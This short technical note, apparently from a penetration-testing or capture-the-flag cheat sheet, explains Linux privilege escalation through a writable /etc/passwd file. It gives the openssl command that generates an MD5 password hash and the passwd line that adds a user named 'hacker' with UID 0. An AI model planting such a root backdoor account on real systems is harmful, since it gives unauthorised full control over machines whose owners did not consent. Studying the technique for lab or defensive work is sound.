

# Escalation
We can use OpenSSL to create a new hashed password for us to then paste into the `/etc/passwd` file to create a new user that hopefully has root privileges. The procedure is the following
```sh
openssl passwd -1 -salt 14 password1234
```
This will use the option passwd of openssl to create a md5 hash (`-1`) of the entered password salted with the value provided (`-salt 14`)

Finally adding it into `/etc/passwd`
```sh
hacker:$1$14$HASHGOESHERE:0:0:root:/root:/bin/bash
```
